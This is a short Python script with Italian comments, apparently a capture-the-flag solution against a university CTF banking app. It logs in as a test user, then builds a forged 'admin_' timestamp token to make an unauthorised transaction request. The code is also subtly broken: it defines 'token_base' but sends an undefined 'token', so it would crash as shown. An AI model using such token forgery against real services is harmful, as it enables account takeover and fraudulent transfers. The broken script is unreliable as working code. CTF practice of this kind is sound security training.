import requests
import time

# URL di login
login_url = "http://ctf.unife.it:13086/login"

# Credenziali per il login
login_data = {
    'username': 'test',
    'password': 'test'
}

# Funzione per effettuare il login e ottenere un token (se presente nella risposta)
def login():
    # Effettua la richiesta POST al login
    response = requests.post(login_url, data=login_data)
    
    # Controllo lo status code
    if response.status_code == 200:
        print("Login riuscito!")
        # Supponiamo che il token venga restituito nel corpo della risposta
        print("Risposta del login:", response.text)
        return response.text.strip()  # Rimuovi eventuali spazi extra o ritorni a capo
    elif response.status_code == 401:
        print("Errore di autenticazione: username o password errati.")
    elif response.status_code == 403:
        print("Errore: accesso vietato.")
    elif response.status_code == 500:
        print("Errore interno del server.")
    else:
        print(f"Errore nel login: codice di stato {response.status_code}")
    
    return None

# Funzione per generare il token dinamico e fare la richiesta GET
def generate_token_and_request():
    
    
    # Ottieni il timestamp attuale
    timestamp = int(time.time())  # Ottieni il timestamp corrente in secondi
    # Genera il token con 'admin' invece di 'test' e il timestamp corrente
    token_base = f"admin_{timestamp}_^50"  # La parte comune del token
    
    
    url = f"http://ctf.unife.it:13086/effettua-transazione?toconto=4&amount=5&token={token}"
        
        
    # Esegui la richiesta GET
    response = requests.get(url)
        
    # Mostra la risposta
    if response.status_code == 200:
        print(f"Richiesta per il token {token} completata con successo!")
        print("Risposta del server:")
        print(response.text)  # Stampa il contenuto della risposta
    else:
        print(f"Errore con il token {token}: {response.status_code}")
        print(f"Messaggio di errore: {response.text}")  # Stampa il contenuto della risposta in caso di errore

# Esegui il login
login_response = login()

# Se il login ha successo, esegui la generazione dei token e la richiesta GET
generate_token_and_request()
